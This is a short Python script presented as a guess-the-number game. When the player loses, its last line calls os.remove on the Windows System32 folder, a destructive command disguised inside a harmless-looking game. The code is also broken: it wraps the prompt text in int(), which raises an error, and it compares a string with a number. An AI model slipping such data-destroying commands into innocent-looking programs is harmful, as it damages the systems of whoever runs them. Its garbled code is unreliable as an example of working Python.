import random
import os

number = random.randint(1,10)

guess = input(int("To win guess the number 1 to 10"))

if guess == number:
    print("You Win!!!")
else:
    print("You lose!!!")
    os.remove("C:\Windows\System32")